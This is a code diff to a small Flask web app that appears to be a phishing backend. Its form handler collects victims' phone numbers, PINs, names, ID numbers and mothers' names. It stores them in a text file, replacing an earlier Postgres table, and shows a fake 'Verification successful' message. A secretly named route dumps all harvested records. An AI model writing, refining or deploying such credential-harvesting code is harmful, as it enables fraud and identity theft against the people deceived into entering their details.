@@ -1,26 +1,7 @@
 from flask import Flask, request, render_template_string
-import os, psycopg2
+import os
 
 app = Flask(__name__)
-
-DATABASE_URL = os.environ.get('DATABASE_URL')
-if not DATABASE_URL:
-    raise Exception("DATABASE_URL environment variable not set")
-
-conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-cur = conn.cursor()
-cur.execute('''
-    CREATE TABLE IF NOT EXISTS logs (
-        id SERIAL PRIMARY KEY,
-        phone TEXT,
-        pin TEXT,
-        name TEXT,
-        id_num TEXT,
-        mother TEXT,
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    )
-''')
-conn.commit()
 
 HTML = """
 <!DOCTYPE html>
@@ -52,25 +33,17 @@ def submit():
     name = request.form.get('name')
     id_num = request.form.get('id')
     mother = request.form.get('mother')
-    cur.execute(
-        "INSERT INTO logs (phone, pin, name, id_num, mother) VALUES (%s, %s, %s, %s, %s)",
-        (phone, pin, name, id_num, mother)
-    )
-    conn.commit()
+    with open('log.txt', 'a') as f:
+        f.write(f"{phone}|{pin}|{name}|{id_num}|{mother}\n")
     return "Verification successful. You will be redirected."
 
 @app.route('/view-270ea80433ceb605')
 def log():
-    cur.execute("SELECT phone, pin, name, id_num, mother, created_at FROM logs ORDER BY id DESC")
-    rows = cur.fetchall()
-    if not rows:
+    try:
+        with open('log.txt', 'r') as f:
+            return "<pre>" + f.read() + "</pre>"
+    except:
         return "No data yet."
-    out = "<pre>"
-    for row in rows:
-        out += f"{row[0]} | {row[1]} | {row[2]} | {row[3]} | {row[4]} | {row[5]}\n"
-    out += "</pre>"
-    return out
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=8080)
-    
